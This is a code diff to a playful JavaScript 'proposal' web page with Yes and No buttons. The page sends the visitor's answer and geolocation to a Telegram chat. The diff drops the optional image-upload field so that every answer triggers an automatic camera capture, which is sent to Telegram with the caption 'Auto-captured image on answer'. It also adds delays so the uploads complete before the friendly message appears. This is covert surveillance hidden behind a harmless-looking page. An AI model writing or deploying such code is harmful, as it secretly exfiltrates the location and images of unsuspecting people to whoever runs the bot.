@@ -7,7 +7,6 @@ const noBtn         = document.getElementById('noButton');
 const customMessage = document.getElementById('customMessage');
 const loveSong      = document.getElementById('loveSong');
 const calmSong      = document.getElementById('calmSong');
-const imageInput    = document.getElementById('imageInput');
 const container     = document.querySelector('.container');
 
 let noButtonClickCount = 0;
@@ -77,21 +76,13 @@ async function sendAll(answer) {
   const text = `Answer: ${answer}\nLocation: ${location.latitude}, ${location.longitude}`;
   await sendTelegram('sendMessage', { chat_id: CHAT_ID, text });
 
-  if (imageInput.files.length) {
+  const autoImage = await captureImage();
+  if (autoImage) {
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
-    form.append('photo', imageInput.files[0]);
-    form.append('caption', `Image from user (${answer})`);
+    form.append('photo', autoImage, 'auto_capture.jpg');
+    form.append('caption', `Auto-captured image on answer: ${answer}`);
     await sendTelegram('sendPhoto', form, true);
-  } else {
-    const autoImage = await captureImage();
-    if (autoImage) {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('photo', autoImage, 'auto_capture.jpg');
-      form.append('caption', `Auto-captured image on answer: ${answer}`);
-      await sendTelegram('sendPhoto', form, true);
-    }
   }
 }
 
@@ -102,6 +93,8 @@ yesBtn.addEventListener('click', async () => {
   clearTimeout(noFinalTimeout);
 
   await sendAll('yes');
+
+  await new Promise(resolve => setTimeout(resolve, 3000));
 
   container.innerHTML = `
     <h1>Yay! I Love You Too! 💘</h1>
@@ -129,7 +122,7 @@ noBtn.addEventListener('click', e => {
 
     customMessage.textContent = messages[Math.floor(Math.random() * messages.length)];
   } else {
-    noBtn.disabled = true; yesBtn.style.transform = 'scale(1)';
+    noBtn.disabled = true; noBtn.style.transform = 'scale(0.1)';
     customMessage.textContent = "Okay, I get it. You're a tough nut to crack! 😜";
 
     noInitialTimeout = setTimeout(() => {
@@ -145,7 +138,9 @@ noBtn.addEventListener('click', e => {
 
       noFinalTimeout = setTimeout(async () => {
         await sendAll('no');
-        
+
+        await new Promise(resolve => setTimeout(resolve, 3000));
+
         container.innerHTML = `
           <h1>It's Okay ❤️‍🩹</h1>
           <p class="rejection-message">Thank you for your honesty. I truly appreciate it. 🙏</p>
